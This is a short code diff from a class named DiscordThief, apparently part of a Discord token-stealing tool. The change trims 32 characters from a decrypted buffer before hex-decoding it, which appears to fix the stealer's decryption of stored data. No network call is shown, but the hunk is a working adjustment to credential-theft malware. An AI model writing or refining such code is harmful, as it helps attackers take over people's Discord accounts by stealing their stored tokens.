@@ -78,7 +78,7 @@ export class DiscordThief {
             }
         )
 
-        const hex = decryptedBuffer.toString()
+        const hex = decryptedBuffer.toString().slice(0, -32)
         const decoded = Buffer.from(hex, 'hex').toString()
 
         return decoded
